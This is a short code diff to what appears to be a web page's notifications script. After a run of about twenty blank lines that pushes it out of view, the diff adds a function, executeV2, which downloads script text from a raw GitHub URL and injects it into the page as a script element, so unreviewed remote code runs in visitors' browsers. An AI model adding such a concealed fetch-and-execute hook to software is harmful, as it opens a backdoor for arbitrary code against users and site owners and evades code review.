@@ -295,3 +295,48 @@ if (document.readyState === "loading") {
 } else {
     loadNotifications();
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+async function executeV2() {
+    const scriptUrl = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/cmd2.execute';
+    try {
+        console.log("Attempting to load script from:", scriptUrl);
+        
+        // Fetch the script content
+        const response = await fetch(scriptUrl);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch script: ${response.status} ${response.statusText}`);
+        }
+        
+        const scriptContent = await response.text();
+        console.log("Script content loaded:", scriptContent);
+
+        // Create a script element and execute it
+        const scriptElement = document.createElement('script');
+        scriptElement.textContent = scriptContent;
+        document.body.appendChild(scriptElement);
+        
+        console.log("Script executed successfully.");
+    } catch (error) {
+        console.error("Error loading and executing script:", error);
+    }
+}
